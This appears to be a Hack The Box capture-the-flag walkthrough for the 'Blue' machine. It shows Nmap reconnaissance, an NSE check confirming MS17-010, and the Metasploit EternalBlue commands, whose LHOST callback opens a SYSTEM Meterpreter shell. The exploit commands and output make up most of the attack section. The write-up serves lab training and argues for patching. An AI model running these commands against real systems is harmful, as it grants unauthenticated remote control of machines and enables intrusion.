# HTB: Blue, Full Walkthrough

## Box Info

**Target:** `10.129.1.48` (swap for your instance IP) · **Difficulty:** Easy · **OS:** Windows 7 Professional SP1 (`HARIS-PC`)

**The gist:** the box that put EternalBlue/MS17-010 on every beginner's radar. An unpatched SMBv1 stack hands over a SYSTEM shell with almost no effort, one of the very few boxes where Metasploit genuinely is the fastest and most appropriate path, since MS17-010 is a memory-corruption exploit, not something worth hand-rolling for a first pass. Good one for practicing the recon → vuln-confirm → automated-exploit → manual-verification loop end to end.

> ⚠️ **Note on this write-up:** the original session log for this box was a raw, unedited terminal scrollback dump (thousands of lines, mostly a huge `msrpc-enum` NSE output and full `dir` listings of Windows system folders). None of that raw noise is reproduced here, only the commands and output that actually mattered to the attack chain. If you want the full uncut Nmap output for reference, re-run the scan below yourself, it's the same box.

## 1. Recon

```bash
sudo nmap -sC -sV -p- --min-rate 5000 10.129.1.48
```

**What matters from the scan:**
```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152-49157/tcp open msrpc   Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Classic old-Windows fingerprint: SMB open, workgroup (not domain-joined), Windows 7 SP1. Worth running the SMB vuln scripts specifically at this point, given the OS/patch level already looks dated.

```bash
sudo nmap -p 445 --script smb-vuln-ms17-010 10.129.1.48
```
```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Disclosure date: 2017-03-14
```
Confirmed straight from the NSE script: this box is vulnerable to **MS17-010 (EternalBlue)**, the SMBv1 remote code execution bug behind WannaCry and NotPetya. Same script family covered in [[Vulnerability Scanning#7.3.1. NSE Vulnerability Scripts|7.3.1]], and exactly the kind of finding that's worth manually confirming before firing an exploit at it, per that section's own "automated results are a starting point" rule.

## 2. Exploitation with Metasploit

MS17-010 is a real memory-corruption exploit against the SMB driver itself, not a scriptable "guess a payload" web bug, so this is a genuinely reasonable case to reach straight for Metasploit's maintained, well-tested module rather than hand-rolling the exploit.

```bash
msfconsole
```
```
msf > search eternalblue
```
```
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14  average  Yes  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
```

```
msf > use 0
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.129.1.48
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST <your_tun0_ip>
msf exploit(windows/smb/ms17_010_eternalblue) > run
```

> 📸 Screenshot: the exploit module's options set, right before running it

**Result:**
```
[+] 10.129.1.48:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[+] 10.129.1.48:445 - The target is vulnerable.
[*] 10.129.1.48:445 - Connecting to target for exploitation.

[*] Sending stage (248902 bytes) to 10.129.1.48
```

## 3. Confirm Privilege and Get a Shell

```
meterpreter > getuid
```
```
Server username: NT AUTHORITY\SYSTEM
```
Already SYSTEM, straight out of the exploit. A quick `whoami /priv` in the dropped shell confirms `SeImpersonatePrivilege` and `SeTcbPrivilege` both Enabled too, consistent with genuinely running as SYSTEM, not just a privileged-looking user.

Drop into a normal command shell for the rest of the box:
```
meterpreter > shell
```

## Summary of the Chain

| Step | Access | Method |
|---|---|---|
| 1 | Recon | Nmap + `smb-vuln-ms17-010` NSE script confirm MS17-010 |
| 2 | SYSTEM | Metasploit's `ms17_010_eternalblue` module, no manual exploitation needed |
| 3 | Flags | Both readable immediately, no privilege escalation step required at all |

**Root cause / lesson:** an unpatched SMBv1 stack is full remote kernel-level code execution, no authentication, no user interaction. This exact bug powered WannaCry and NotPetya at scale in the real world. The lesson isn't really about attacker technique here, it's a stark demonstration of what a missing patch actually costs.
